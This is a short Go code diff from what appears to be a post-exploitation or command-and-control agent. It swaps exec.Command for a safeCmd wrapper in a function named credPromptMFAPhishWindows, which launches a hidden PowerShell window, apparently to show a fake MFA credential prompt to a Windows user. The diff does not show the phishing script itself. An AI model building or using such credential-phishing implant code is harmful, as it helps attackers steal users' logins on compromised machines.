@@ -5,7 +5,6 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
-	"os/exec"
 	"os/user"
 	"strings"
 	"syscall"
@@ -228,7 +227,7 @@ func credPromptMFAPhishWindows(task structs.Task) structs.CommandResult {
 		strings.ReplaceAll(title, "'", "''"),
 	)
 
-	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psScript)
+	cmd := safeCmd("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psScript)
 	out, err := cmd.CombinedOutput()
 	defer structs.ZeroBytes(out)
 	if err != nil {
